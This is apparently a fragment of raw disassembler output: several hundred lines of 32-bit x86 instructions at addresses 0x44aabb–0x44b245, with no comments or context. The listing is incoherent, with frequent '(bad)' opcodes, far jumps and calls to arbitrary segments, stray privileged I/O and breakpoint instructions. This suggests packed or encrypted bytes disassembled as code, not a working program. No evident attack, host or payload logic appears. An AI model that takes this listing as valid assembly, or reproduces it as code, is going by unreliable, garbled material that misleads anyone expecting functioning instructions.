  44aabb:	jmp    0x44ab1b
  44aabd:	jbe    0x44ab23
  44aabf:	lods   al,BYTE PTR ds:[esi]
  44aac0:	push   0x47
  44aac2:	mov    dl,0x3e
  44aac4:	mov    ds:0x469bba3f,al
  44aac9:	popa   
  44aaca:	lock fs test al,0xc3
  44aace:	loop   0x44ab24
  44aad0:	push   es
  44aad1:	aas    
  44aad2:	popa   
  44aad3:	inc    edx
  44aad4:	sub    DWORD PTR [edx-0x22],esp
  44aad7:	push   0x486040b0
  44aadc:	mov    dh,0xfe
  44aade:	adc    bl,BYTE PTR [ebx+0x6d]
  44aae1:	push   cs
  44aae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44aae3:	push   edi
  44aae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44aae5:	sub    al,0x6f
  44aae7:	mov    ah,0xf6
  44aae9:	pop    eax
  44aaea:	push   0x1686e4d8
  44aaef:	cmp    bh,BYTE PTR [ebx-0x20]
  44aaf2:	push   cs
  44aaf3:	jo     0x44aacf
  44aaf5:	shr    BYTE PTR [ebx+0x4a],cl
  44aaf8:	mov    dl,0xbf
  44aafa:	mov    ds:0xe1ab2605,al
  44aaff:	mov    al,0xd0
  44ab01:	out    0xa4,al
  44ab03:	pop    esp
  44ab04:	int3   
  44ab05:	dec    DWORD PTR [edx-0x8]
  44ab08:	push   0x155ef3b4
  44ab0d:	and    bl,dh
  44ab0f:	push   ecx
  44ab10:	jle    0x44aad2
  44ab12:	ret    0xd60b
  44ab15:	and    BYTE PTR [esi],bl
  44ab17:	shr    BYTE PTR [ebx],0x16
  44ab1a:	or     BYTE PTR [eax-0x3d475ba9],0x50
  44ab21:	push   ds
  44ab22:	or     eax,0x8f8cbc09
  44ab27:	and    al,0xce
  44ab29:	(bad)  
  44ab2a:	sbb    DWORD PTR [ebx+0x1658f4b7],eax
  44ab30:	(bad)  
  44ab31:	sbb    al,0x59
  44ab33:	ficom  WORD PTR [eax]
  44ab35:	js     0x44aba0
  44ab37:	loope  0x44ab7f
  44ab39:	xchg   esi,eax
  44ab3a:	adc    BYTE PTR [edx+0x37e16813],bh
  44ab40:	ds dec esi
  44ab42:	in     al,dx
  44ab43:	dec    eax
  44ab44:	mov    dl,0x5f
  44ab46:	ja     0x44aadd
  44ab48:	push   ds
  44ab49:	add    DWORD PTR [edi],edi
  44ab4b:	adc    BYTE PTR [eax+0xa015895],dl
  44ab51:	fisubr WORD PTR [edx-0x551eb05e]
  44ab57:	cdq    
  44ab58:	and    BYTE PTR [eax],bh
  44ab5a:	bound  edx,QWORD PTR [ebp+0x48]
  44ab5d:	xor    esp,DWORD PTR [ebp+0x6c39c407]
  44ab63:	nop
  44ab64:	(bad)  
  44ab65:	xchg   ebx,eax
  44ab66:	shr    BYTE PTR [ebp-0x55],1
  44ab69:	pop    eax
  44ab6a:	shl    al,0x3e
  44ab6d:	xor    edi,DWORD PTR [eax+0x26]
  44ab70:	jo     0x44ab62
  44ab72:	aam    0xe7
  44ab74:	in     al,0x7e
  44ab76:	int3   
  44ab77:	sbb    bh,BYTE PTR [esi]
  44ab79:	imul   esi,DWORD PTR [ebx-0x7f],0xa2f64c72
  44ab80:	xor    al,0x7b
  44ab82:	cmp    al,0x8e
  44ab84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ab85:	shld   DWORD PTR [ebx+eiz*2-0x5d0ed391],esi,0x2
  44ab8e:	xchg   ecx,eax
  44ab8f:	aam    0x4c
  44ab91:	or     DWORD PTR [edx],esi
  44ab93:	fdivr  st,st(2)
  44ab95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ab96:	lods   eax,DWORD PTR ds:[esi]
  44ab97:	in     eax,dx
  44ab98:	adc    dh,al
  44ab9a:	mov    ecx,0xa66df4db
  44ab9f:	mov    DWORD PTR [esi],ecx
  44aba1:	push   ebx
  44aba2:	addr16 loopne 0x44abb6
  44aba5:	outs   dx,BYTE PTR ds:[esi]
  44aba6:	dec    esi
  44aba7:	mov    ah,0x7c
  44aba9:	mov    eax,ds:0x5836b407
  44abae:	push   ss
  44abaf:	dec    eax
  44abb0:	int3   
  44abb1:	push   edi
  44abb2:	pop    esp
  44abb3:	pop    ecx
  44abb4:	dec    ebp
  44abb5:	ret    
  44abb6:	add    DWORD PTR [esi+0x5d],edi
  44abb9:	fidivr DWORD PTR [edx+0xd52a3ee]
  44abbf:	dec    esi
  44abc0:	ret    0xf3b6
  44abc3:	mov    esp,0xf6c40ac2
  44abc8:	add    al,0x9a
  44abca:	xlat   BYTE PTR ds:[ebx]
  44abcb:	out    dx,al
  44abcc:	and    al,0xed
  44abce:	xor    al,0xb1
  44abd0:	sar    BYTE PTR [esi],0x46
  44abd3:	cwde   
  44abd4:	or     DWORD PTR [esi],edx
  44abd6:	(bad)  
  44abd7:	xchg   ecx,eax
  44abd8:	and    eax,0xf86b5a0b
  44abdd:	or     BYTE PTR [ebx],ch
  44abdf:	xchg   edx,eax
  44abe0:	jmp    0x44abd0
  44abe2:	cmp    al,0xc4
  44abe4:	add    dh,al
  44abe6:	test   eax,0x6fc647e3
  44abeb:	adc    ecx,DWORD PTR [edi+ebp*2+0x41]
  44abef:	fs repz pop ecx
  44abf2:	(bad)
  44abf6:	inc    edx
  44abf7:	ds push 0xadac2b51
  44abfd:	xlat   BYTE PTR ds:[ebx]
  44abfe:	imul   eax,DWORD PTR [eax-0x1eb4ede2],0x7c
  44ac05:	and    ebp,DWORD PTR [ecx]
  44ac07:	mov    dh,0x6c
  44ac09:	lds    esp,FWORD PTR [edi]
  44ac0b:	jb     0x44ac2a
  44ac0d:	push   edx
  44ac0e:	mov    ebp,0x6cf110c8
  44ac13:	adc    cl,ch
  44ac15:	jbe    0x44abf4
  44ac17:	sahf   
  44ac18:	sub    eax,0xd80a1e13
  44ac1d:	lock jae 0x44ac7d
  44ac20:	test   BYTE PTR [ebp+0xa364a5e],cl
  44ac26:	adc    al,0xc6
  44ac28:	push   ss
  44ac29:	push   ds
  44ac2a:	jb     0x44abaf
  44ac2c:	ret    0x437e
  44ac2f:	push   0xffffffdc
  44ac31:	fistp  DWORD PTR [eax+ecx*8]
  44ac34:	addr16 cli 
  44ac36:	icebp  
  44ac37:	adc    DWORD PTR [edx-0x42],ebp
  44ac3a:	mov    gs,WORD PTR [edx+0xec500fa]
  44ac40:	jne    0x44ac88
  44ac42:	mov    edx,0xbb61492e
  44ac47:	add    cl,BYTE PTR [esi-0x42c2954f]
  44ac4d:	imul   BYTE PTR [eax]
  44ac4f:	or     ebp,DWORD PTR [edi]
  44ac51:	cmp    bl,BYTE PTR [eax+esi*2+0x16106e68]
  44ac58:	push   ds
  44ac59:	inc    eax
  44ac5a:	sar    BYTE PTR [ecx+0x54b8b469],0xe2
  44ac61:	xchg   ebx,eax
  44ac62:	mov    edi,ecx
  44ac64:	cli    
  44ac65:	cmp    ch,BYTE PTR [edx+0x26]
  44ac68:	dec    ebx
  44ac69:	push   ds
  44ac6a:	or     BYTE PTR [ebp+0x6a79630a],dh
  44ac70:	jno    0x44acb8
  44ac72:	cmp    bh,BYTE PTR [eax+0x36]
  44ac75:	jbe    0x44acb0
  44ac77:	jle    0x44ac59
  44ac79:	mov    ds,WORD PTR [eax-0x5a]
  44ac7c:	sub    DWORD PTR [esi+0x9],edi
  44ac7f:	push   0x4d
  44ac81:	xchg   edx,eax
  44ac82:	sub    al,0xf4
  44ac84:	xor    DWORD PTR [eax-0x5e],ecx
  44ac87:	xor    cl,BYTE PTR [edx+ebp*8]
  44ac8a:	adc    esp,DWORD PTR [eax]
  44ac8c:	int3   
  44ac8d:	test   eax,0xd00087b4
  44ac92:	add    ch,BYTE PTR [edi+0x7052d8fe]
  44ac98:	test   eax,0x2d9c7c01
  44ac9d:	xor    al,0xde
  44ac9f:	push   ebx
  44aca0:	push   ebp
  44aca1:	xchg   edi,eax
  44aca2:	and    BYTE PTR [edx+0x7fd27800],cl
  44aca8:	cld    
  44aca9:	fs nop
  44acab:	ss sti 
  44acad:	sub    DWORD PTR [esi-0x7d17b54e],0xe7eeba6
  44acb7:	dec    eax
  44acb8:	add    eax,0x60affc47
  44acbd:	int    0xe2
  44acbf:	sub    esi,DWORD PTR [eax]
  44acc1:	inc    ebx
  44acc2:	push   0x6a
  44acc4:	jg     0x44ac5c
  44acc6:	shl    BYTE PTR [ebx],0xb8
  44acc9:	sub    al,BYTE PTR [ebp+0x65696a0f]
  44accf:	sub    al,0xef
  44acd1:	jb     0x44ad2a
  44acd3:	adc    eax,0x8ed537c2
  44acd8:	mov    edi,0xaaec5238
  44acdd:	aam    0x6c
  44acdf:	jmp    0x24aadce5
  44ace4:	(bad)  
  44ace5:	adc    eax,0x894ba6a
  44acea:	inc    edx
  44aceb:	cmp    dh,cl
  44aced:	loop   0x44acbe
  44acef:	xor    al,0xb5
  44acf1:	dec    edi
  44acf2:	dec    eax
  44acf3:	mov    esp,0xb2afb865
  44acf8:	lods   eax,DWORD PTR ds:[esi]
  44acf9:	pop    ss
  44acfa:	adc    BYTE PTR [esi],0x35
  44acfd:	xor    al,BYTE PTR [edx]
  44acff:	enter  0x9b30,0x92
  44ad03:	(bad)  
  44ad04:	call   0x8494:0xb8184e68
  44ad0b:	jmp    0x7c6d:0x2140405
  44ad12:	pop    edi
  44ad13:	jmp    0xbf1c:0x9f5a10e
  44ad1a:	jp     0x44ad3a
  44ad1c:	xchg   esi,eax
  44ad1d:	push   ds
  44ad1e:	ret    
  44ad1f:	ret    0x3a05
  44ad22:	scas   al,BYTE PTR es:[edi]
  44ad23:	mov    esp,esi
  44ad25:	or     BYTE PTR [ebx+0x51],bl
  44ad28:	mov    ebx,0xa7e2c1ac
  44ad2d:	or     bh,0x52
  44ad30:	cmp    al,0x96
  44ad32:	push   eax
  44ad33:	test   DWORD PTR [ecx+0xd],esi
  44ad36:	push   edx
  44ad37:	lahf   
  44ad38:	jb     0x44ad56
  44ad3a:	xor    al,0x22
  44ad3c:	add    DWORD PTR [edi+0x68e29592],0x85620b48
  44ad46:	scas   al,BYTE PTR es:[edi]
  44ad47:	sbb    edi,esp
  44ad49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ad4a:	push   es
  44ad4b:	fiadd  DWORD PTR ds:0x81fe9456
  44ad51:	loopne 0x44ad0d
  44ad53:	and    bl,BYTE PTR [eax]
  44ad55:	stos   DWORD PTR es:[edi],eax
  44ad56:	sbb    eax,0xe6529d4a
  44ad5b:	call   0xcaad:0x554a4628
  44ad62:	sub    al,0x9c
  44ad64:	push   es
  44ad65:	xchg   esi,eax
  44ad66:	mov    dl,0x4b
  44ad68:	jle    0x44ad7e
  44ad6a:	call   0x604a2ea2
  44ad6f:	jmp    0x4622de43
  44ad74:	add    dh,BYTE PTR [ebp-0xe63987b]
  44ad7a:	mul    BYTE PTR [eax+0x13]
  44ad7d:	mov    ch,0x39
  44ad7f:	mov    ch,dl
  44ad81:	xchg   esi,eax
  44ad82:	xor    al,0xf3
  44ad84:	jmp    0x9ddb:0x5b3d2dde
  44ad8b:	(bad)  
  44ad8d:	aam    0x30
  44ad8f:	in     al,dx
  44ad90:	imul   edi,DWORD PTR [eax+eax*1+0x2a],0xfffffff6
  44ad95:	push   ecx
  44ad96:	fs or  bh,dh
  44ad99:	in     al,dx
  44ad9a:	xor    al,0x33
  44ad9c:	mov    WORD PTR [esi-0x2bb79958],cs
  44ada2:	xchg   esp,eax
  44ada3:	out    dx,eax
  44ada4:	xlat   BYTE PTR ds:[ebx]
  44ada5:	and    al,0x16
  44ada7:	push   esp
  44ada8:	call   0xb548:0x90996053
  44adaf:	or     DWORD PTR [ebp-0x2ee997d6],ebp
  44adb5:	jmp    0x4ca4:0xf94efcdd
  44adbc:	cmp    edi,DWORD PTR [esi+0x56fc951e]
  44adc2:	mov    BYTE PTR [eax+0x22],al
  44adc5:	popa   
  44adc6:	and    ah,BYTE PTR [ebp+0x38]
  44adc9:	out    0x8,al
  44adcb:	lahf   
  44adcc:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  44adce:	mov    dh,0xca
  44add0:	stos   BYTE PTR es:[edi],al
  44add1:	xor    al,0x4d
  44add3:	scas   eax,DWORD PTR es:[edi]
  44add4:	push   eax
  44add5:	fs jbe 0x44ae55
  44add8:	adc    bh,cl
  44adda:	jp     0x44adaa
  44addc:	(bad)  
  44addd:	push   0xb0fda97
  44ade2:	fdivr  DWORD PTR [esi]
  44ade4:	fs pusha 
  44ade6:	sar    BYTE PTR [eax-0x49],cl
  44ade9:	retf   0x35ee
  44adec:	mov    DWORD PTR [edi+0x750f2c34],ebx
  44adf2:	test   BYTE PTR [edx],0x0
  44adf5:	sub    esp,ebx
  44adf7:	mov    eax,0x1d0ec59
  44adfc:	loopne 0x44ad95
  44adfe:	fidiv  DWORD PTR [eax+edi*2+0x1d42d58]
  44ae05:	xor    dl,BYTE PTR [eax]
  44ae07:	jle    0x44ae12
  44ae09:	(bad)  
  44ae0a:	hlt    
  44ae0b:	dec    ebx
  44ae0c:	sahf   
  44ae0d:	(bad)  
  44ae0e:	enter  0x409e,0x7b
  44ae12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ae13:	xlat   BYTE PTR ds:[ebx]
  44ae14:	mov    al,0x19
  44ae17:	clc    
  44ae18:	mov    al,0x4f
  44ae1a:	mov    BYTE PTR [edx-0x54],bl
  44ae1d:	and    ch,bl
  44ae1f:	inc    ebx
  44ae20:	mov    WORD PTR [ebx+0x43a65ed8],fs
  44ae26:	jmp    0xdcf6:0xf018ae27
  44ae2d:	push   ss
  44ae2e:	imul   eax,DWORD PTR [edx+0x2240d087],0x2
  44ae35:	pusha  
  44ae36:	(bad)  
  44ae37:	js     0x44add3
  44ae39:	inc    edx
  44ae3a:	xor    al,0x49
  44ae3c:	push   0x5d
  44ae3e:	inc    esp
  44ae3f:	sbb    ecx,DWORD PTR [eax]
  44ae41:	jns    0x44ae31
  44ae43:	(bad)  
  44ae44:	jmp    0x44adc8
  44ae46:	adc    BYTE PTR [esi],bh
  44ae48:	cli    
  44ae49:	ja     0x44aeba
  44ae4b:	je     0x44ae86
  44ae4d:	ret    
  44ae4e:	add    eax,DWORD PTR [eax+0x3cff38b6]
  44ae54:	push   edx
  44ae55:	int3   
  44ae56:	and    BYTE PTR [edi+0x1a],dl
  44ae59:	adc    ch,BYTE PTR [edi]
  44ae5b:	or     BYTE PTR [ecx-0x3c],ah
  44ae5e:	cmp    eax,0x1ee15e20
  44ae63:	push   ebx
  44ae64:	js     0x44aec6
  44ae66:	jb     0x44adfc
  44ae68:	ret    
  44ae69:	int3   
  44ae6a:	pop    edx
  44ae6b:	scas   al,BYTE PTR es:[edi]
  44ae6c:	mov    ch,0xa4
  44ae6e:	pop    ds
  44ae6f:	and    al,0x62
  44ae71:	(bad)  
  44ae73:	push   0x27
  44ae75:	stos   BYTE PTR es:[edi],al
  44ae76:	or     esp,edx
  44ae78:	inc    esi
  44ae79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ae7a:	imul   edx,DWORD PTR [eax+edx*4+0x1e],0xffffff80
  44ae7f:	les    ebx,FWORD PTR [esi]
  44ae81:	push   edx
  44ae82:	rol    BYTE PTR [edx+0x4952e853],0x5f
  44ae89:	dec    eax
  44ae8a:	sbb    bh,BYTE PTR [esi+0x2]
  44ae8d:	jg     0x44aee7
  44ae8f:	hlt    
  44ae90:	or     eax,0x7c2064ad
  44ae95:	add    al,0x69
  44ae97:	cwde   
  44ae98:	stos   BYTE PTR es:[edi],al
  44ae99:	jle    0x44ae24
  44ae9b:	add    BYTE PTR [esi],bl
  44ae9d:	sbb    dl,0xa1
  44aea0:	and    cl,0x31
  44aea3:	mov    eax,ds:0x659b3cf6
  44aea8:	shr    BYTE PTR [edi],1
  44aeaa:	mov    edx,0x972202ad
  44aeaf:	aad    0xac
  44aeb1:	je     0x44ae71
  44aeb3:	pop    eax
  44aeb4:	mov    eax,0xedb636b6
  44aeb9:	adc    al,dl
  44aebb:	cmp    BYTE PTR [ecx-0x51deb19a],0x97
  44aec2:	cs js  0x44aed4
  44aec5:	inc    eax
  44aec6:	push   esp
  44aec7:	pop    edx
  44aec8:	data16 (bad) 
  44aeca:	mov    dl,0x9f
  44aecc:	dec    esp
  44aecd:	(bad)  
  44aecf:	dec    edi
  44aed0:	dec    ecx
  44aed1:	(bad)  
  44aed2:	sub    bl,bl
  44aed4:	cld    
  44aed5:	cmp    al,0x10
  44aed7:	fidiv  DWORD PTR ds:0x501207a0
  44aedd:	cmp    dl,bl
  44aedf:	mov    ds:0xe85c2d35,al
  44aee4:	mov    al,cs:0x7b31d63d
  44aeea:	xor    BYTE PTR [eax+0x30d4b42a],al
  44aef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44aef1:	inc    esi
  44aef2:	inc    esi
  44aef3:	xchg   ecx,eax
  44aef4:	rcl    DWORD PTR [edx-0x1f],cl
  44aef7:	pop    esp
  44aef8:	sbb    bh,BYTE PTR [ecx]
  44aefa:	popf   
  44aefb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44aefc:	lods   al,BYTE PTR ds:[esi]
  44aefd:	rcr    DWORD PTR [eax+0x14aa10ed],0x58
  44af04:	jne    0x44af4f
  44af06:	add    DWORD PTR [esi],eax
  44af08:	adc    BYTE PTR [ebp+ebp*1-0xe41f458],bl
  44af0f:	shl    al,1
  44af11:	push   edx
  44af12:	(bad)  
  44af13:	xchg   esp,eax
  44af14:	push   ds
  44af15:	ins    BYTE PTR es:[edi],dx
  44af16:	and    al,ch
  44af18:	push   es
  44af19:	mov    dh,0x7
  44af1b:	dec    edx
  44af1c:	mov    esi,0x43e72e3a
  44af21:	push   ds
  44af22:	lods   eax,DWORD PTR ds:[esi]
  44af23:	neg    BYTE PTR [ebx]
  44af25:	dec    esp
  44af26:	test   DWORD PTR [ebx],0x77d0c8e2
  44af2c:	adc    al,0x1e
  44af2e:	adc    cl,BYTE PTR [ebx]
  44af30:	adc    ch,BYTE PTR [ecx-0x58]
  44af33:	add    BYTE PTR [edi+0x682c6984],0x17
  44af3a:	jo     0x44af31
  44af3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44af3d:	hlt    
  44af3e:	test   ah,dl
  44af40:	lea    edx,[esi]
  44af42:	aam    0x12
  44af44:	sahf   
  44af45:	inc    edx
  44af46:	(bad)  [edx+0x12]
  44af49:	push   ds
  44af4a:	push   ecx
  44af4b:	jmp    0x4768:0x33eeb60a
  44af52:	add    DWORD PTR [ecx+0x3a],0x54fe5142
  44af59:	xor    al,0x6
  44af5b:	push   cs
  44af5c:	pusha  
  44af5d:	pusha  
  44af5e:	push   ecx
  44af5f:	loopne 0x44aee1
  44af61:	inc    eax
  44af62:	ret    
  44af63:	retf   0x9a8
  44af66:	mov    eax,ds:0x4d2a0612
  44af6b:	dec    eax
  44af6c:	ret    0xf1d6
  44af6f:	xchg   esi,eax
  44af70:	mov    bl,0x6
  44af72:	mov    BYTE PTR [eax],dl
  44af74:	sbb    bl,ah
  44af76:	xchg   esi,eax
  44af77:	aam    0x21
  44af79:	pop    ebp
  44af7a:	sahf   
  44af7b:	icebp  
  44af7c:	xchg   esi,eax
  44af7d:	sbb    al,0x5
  44af7f:	test   BYTE PTR [eax],ch
  44af81:	jp     0x44af45
  44af83:	sbb    ebx,DWORD PTR [esi-0xe4379ef]
  44af89:	or     BYTE PTR [edx],al
  44af8b:	pop    edx
  44af8c:	dec    edx
  44af8d:	cli    
  44af8e:	dec    ecx
  44af8f:	mov    esp,0xd055c2df
  44af94:	in     al,dx
  44af95:	mov    bh,0xc8
  44af97:	retf   
  44af98:	xchg   esi,eax
  44af99:	mov    al,ds:0x27b4bca6
  44af9e:	pop    esp
  44af9f:	shr    BYTE PTR [eax-0x7a],cl
  44afa2:	out    dx,al
  44afa3:	jg     0x44af71
  44afa5:	jbe    0x44af77
  44afa7:	dec    eax
  44afa8:	push   esp
  44afa9:	adc    eax,0x5ba2c9a8
  44afae:	and    al,0x42
  44afb0:	or     eax,0x8cd15b4
  44afb5:	mov    esi,0x11a64099
  44afba:	adc    BYTE PTR [eax],ch
  44afbc:	or     edx,DWORD PTR ds:0xaa089eb0
  44afc2:	test   al,0xf
  44afc4:	inc    eax
  44afc5:	push   eax
  44afc6:	mov    DWORD PTR [ebx],esp
  44afc8:	pop    eax
  44afc9:	rol    BYTE PTR [edx+0x20],cl
  44afcc:	xor    BYTE PTR [edx+0x10],al
  44afcf:	add    BYTE PTR [esi+0x20],0x91
  44afd3:	js     0x44afb5
  44afd5:	add    eax,0xb28181ea
  44afda:	mov    edx,0xb01f0f5f
  44afdf:	mov    edx,0xe4a15a75
  44afe4:	icebp  
  44afe5:	push   0x2e12283f
  44afea:	lea    ecx,[ecx]
  44afec:	inc    esi
  44afed:	sbb    eax,DWORD PTR [esi]
  44afef:	call   0x11943eec
  44aff4:	jp     0x44b06f
  44aff6:	add    bh,cl
  44aff8:	loopne 0x44affa
  44affa:	ins    BYTE PTR es:[edi],dx
  44affb:	fld    QWORD PTR [edi]
  44affd:	rol    BYTE PTR [edi],1
  44afff:	push   edx
  44b000:	mov    dl,0x34
  44b002:	jle    0x44affe
  44b004:	shl    BYTE PTR ds:0x56ad91e2,1
  44b00a:	jo     0x44afef
  44b00c:	pop    esi
  44b00d:	dec    edi
  44b00e:	pop    ecx
  44b00f:	pop    eax
  44b010:	jno    0x44afc6
  44b012:	idiv   edx
  44b014:	repz mov bl,0xa8
  44b017:	or     bh,BYTE PTR [edx+0x0]
  44b01a:	mov    dh,0xcb
  44b01c:	sub    BYTE PTR [edi+0x71],bh
  44b01f:	push   ss
  44b020:	jecxz  0x44b02c
  44b022:	das    
  44b023:	add    DWORD PTR [edx-0x1f5250c],esp
  44b029:	ror    BYTE PTR [ecx-0x3],1
  44b02c:	les    eax,FWORD PTR [edi]
  44b02e:	adc    al,0x5d
  44b030:	inc    esi
  44b031:	sahf   
  44b032:	and    DWORD PTR [esp+edx*1+0x4f],0x53
  44b037:	(bad)  
  44b038:	hlt    
  44b039:	mov    esp,0xbae0883b
  44b03e:	xor    dl,al
  44b040:	sbb    al,BYTE PTR [esi+0x366816e7]
  44b046:	sahf   
  44b047:	pop    esi
  44b048:	inc    ebx
  44b049:	push   0x48bccc5
  44b04e:	sbb    BYTE PTR [ecx+ecx*8],ah
  44b051:	popa   
  44b052:	data16 loopne 0x44b06d
  44b055:	push   es
  44b056:	jbe    0x44b0a0
  44b058:	jo     0x44b06a
  44b05a:	js     0x44b085
  44b05c:	ins    DWORD PTR es:[edi],dx
  44b05d:	pop    esi
  44b05e:	cwde   
  44b05f:	(bad)  
  44b061:	icebp  
  44b062:	sbb    eax,0x5e141bf0
  44b067:	xor    dl,BYTE PTR [ecx+ebp*4]
  44b06a:	xchg   esp,eax
  44b06b:	mov    bl,0x7d
  44b06d:	scas   al,BYTE PTR es:[edi]
  44b06e:	imul   edi,DWORD PTR [edx+edx*4],0xe09ae760
  44b075:	(bad)  
  44b076:	aam    0x7
  44b078:	push   ecx
  44b079:	mov    ebx,0x4f08df2
  44b07e:	jmp    0x6c696f81
  44b083:	dec    edi
  44b084:	int3   
  44b085:	out    0xee,eax
  44b087:	lahf   
  44b088:	push   0xffffffcc
  44b08a:	mov    eax,ds:0x34dd0040
  44b08f:	jo     0x44b086
  44b091:	shl    BYTE PTR [edi],cl
  44b093:	adc    bh,al
  44b095:	loop   0x44b0a2
  44b097:	jne    0x44b08d
  44b099:	fisubr DWORD PTR [ecx]
  44b09b:	js     0x44b03f
  44b09d:	mov    edi,eax
  44b09f:	adc    cl,BYTE PTR [edx-0x5c238938]
  44b0a5:	sbb    edx,DWORD PTR [esi+0x1f53a46d]
  44b0ab:	jbe    0x44b02d
  44b0ad:	and    eax,0x217a013e
  44b0b2:	mov    edx,0x7bb447e4
  44b0b7:	inc    ecx
  44b0b8:	pop    ss
  44b0b9:	add    BYTE PTR [edi-0x6e],0x68
  44b0bd:	(bad)  
  44b0be:	push   edx
  44b0bf:	sbb    dh,BYTE PTR [ebx-0x5]
  44b0c2:	dec    eax
  44b0c3:	jmp    0x4c0e:0xdf7071f0
  44b0ca:	adc    eax,DWORD PTR [eax]
  44b0cc:	cld    
  44b0cd:	(bad)  
  44b0ce:	imul   BYTE PTR [eax+0x60]
  44b0d1:	lock sti 
  44b0d3:	imul   BYTE PTR [ecx-0x60]
  44b0d6:	not    BYTE PTR [edi]
  44b0d8:	int    0x20
  44b0da:	loop   0x44b124
  44b0dc:	and    al,0x87
  44b0de:	out    0x88,al
  44b0e0:	rcl    DWORD PTR [edi*2+0x40378090],0x17
  44b0e8:	fcom   DWORD PTR [ebx+ebx*1]
  44b0eb:	xchg   edi,eax
  44b0ec:	and    dh,BYTE PTR [eax-0x14699340]
  44b0f2:	lock test al,0x3f
  44b0f5:	add    DWORD PTR ds:0x30437a18,edx
  44b0fb:	ret    
  44b0fc:	imul   esp,DWORD PTR [ecx+0x70680fb5],0x723084b8
  44b106:	cmp    ch,dh
  44b108:	pop    eax
  44b109:	jbe    0x44b122
  44b10b:	or     eax,0xa808aa6f
  44b110:	lahf   
  44b111:	lock adc al,0xd1
  44b114:	add    DWORD PTR [edx+edi*8],esi
  44b117:	test   DWORD PTR [esi],0xb02c29af
  44b11d:	into   
  44b11e:	xlat   BYTE PTR ds:[ebx]
  44b11f:	xor    DWORD PTR [eax-0x46],0x58e220d8
  44b126:	push   0xffffffaf
  44b128:	mov    dl,0xc7
  44b12a:	sbb    dl,cl
  44b12c:	into   
  44b12d:	cld    
  44b12e:	xchg   ecx,eax
  44b12f:	enter  0x4964,0x41
  44b133:	shl    al,0x5
  44b136:	lods   eax,DWORD PTR ds:[esi]
  44b137:	shl    DWORD PTR [esp+eiz*8-0x68],0xca
  44b13c:	push   edx
  44b13d:	add    al,0x6
  44b13f:	mov    ecx,0x59060d15
  44b144:	ins    BYTE PTR es:[edi],dx
  44b145:	jp     0x44b0e7
  44b147:	pop    esi
  44b148:	jmp    0xf00a:0x6b6968f8
  44b14f:	push   ss
  44b150:	mov    ch,0x57
  44b152:	inc    eax
  44b153:	(bad)  
  44b154:	jo     0x44b1aa
  44b156:	or     BYTE PTR [ebp+0x1],bh
  44b159:	push   eax
  44b15a:	(bad)  
  44b15b:	xchg   edx,eax
  44b15c:	cmovp  ebx,DWORD PTR [eax-0x77]
  44b160:	xor    DWORD PTR [eax+edx*4+0xd],ecx
  44b164:	int3   
  44b165:	or     eax,DWORD PTR [edi-0x2c]
  44b168:	daa    
  44b169:	mov    ds,WORD PTR [edi+0x5b30165d]
  44b16f:	je     0x44b17d
  44b171:	mov    ds:0x457e5dd8,eax
  44b176:	ret    0xc902
  44b179:	fsubr  QWORD PTR ds:0x846d2e8
  44b17f:	push   eax
  44b180:	mov    cl,0x4d
  44b182:	mov    gs:0xa0c2643,eax
  44b188:	dec    eax
  44b189:	adc    ebp,DWORD PTR cs:[ebp-0x6f]
  44b18d:	and    DWORD PTR [eax-0x4fdf2c04],0x48
  44b194:	jo     0x44b181
  44b196:	ror    BYTE PTR [esi+0x76b44963],cl
  44b19c:	test   BYTE PTR [ecx],dh
  44b19e:	dec    edx
  44b19f:	push   esp
  44b1a0:	enter  0x786c,0xfa
  44b1a4:	sub    ebx,DWORD PTR [eax+0x794c9c28]
  44b1aa:	or     DWORD PTR [eax],edx
  44b1ac:	sbb    eax,0x42dc3661
  44b1b1:	test   BYTE PTR [edx-0x57437595],ch
  44b1b7:	ret    
  44b1b8:	mov    ds:0xb0929f8c,al
  44b1bd:	add    al,0x7b
  44b1bf:	xchg   esi,eax
  44b1c0:	inc    dh
  44b1c2:	xor    ecx,esp
  44b1c4:	pusha  
  44b1c5:	or     BYTE PTR [edi],bl
  44b1c7:	cs cli 
  44b1c9:	ss leave 
  44b1cb:	mov    eax,0x6eb066ac
  44b1d0:	call   0x8cb:0x6e807894
  44b1d7:	mov    esp,0xed17b6ee
  44b1dc:	pop    edx
  44b1dd:	(bad)  
  44b1de:	hlt    
  44b1df:	adc    DWORD PTR [eax],0xf6c44040
  44b1e5:	mov    BYTE PTR [edx],bh
  44b1e7:	push   edx
  44b1e8:	rol    BYTE PTR [edx+0x71463466],0xb4
  44b1ef:	arpl   WORD PTR [edi+0x76],bx
  44b1f2:	unpcklps xmm7,XMMWORD PTR [esi+0xe]
  44b1f6:	sub    BYTE PTR [edx],0xc8
  44b1f9:	dec    esi
  44b1fa:	cs call 0x6865:0xa2c652f0
  44b202:	adc    eax,0x861c2e19
  44b207:	lock inc ecx
  44b209:	jmp    0xf66058c5
  44b20e:	sbb    cl,BYTE PTR [edx+0x6]
  44b211:	mov    al,0x75
  44b213:	pop    eax
  44b214:	int3   
  44b215:	cdq    
  44b216:	inc    ebp
  44b217:	(bad)  
  44b219:	sub    BYTE PTR [eax],bl
  44b21b:	les    eax,FWORD PTR [eax]
  44b21d:	sbb    eax,0x6fe876a
  44b222:	jl     0x44b21a
  44b224:	scas   al,BYTE PTR es:[edi]
  44b225:	or     DWORD PTR [ecx-0x9f04a94],edi
  44b22b:	cmp    eax,0xbbd6b96a
  44b230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b231:	mov    cl,0x55
  44b233:	shr    bl,cl
  44b235:	push   edx
  44b236:	fdiv   DWORD PTR [ecx-0x28]
  44b239:	fistp  QWORD PTR [edx]
  44b23b:	dec    ebx
  44b23c:	pusha  
  44b23d:	push   ecx
  44b23e:	inc    edi
  44b23f:	retf   
  44b240:	js     0x44b1f7
  44b242:	bound  ebx,QWORD PTR [ebp+0x27]
  44b245:	jo     0x44b252
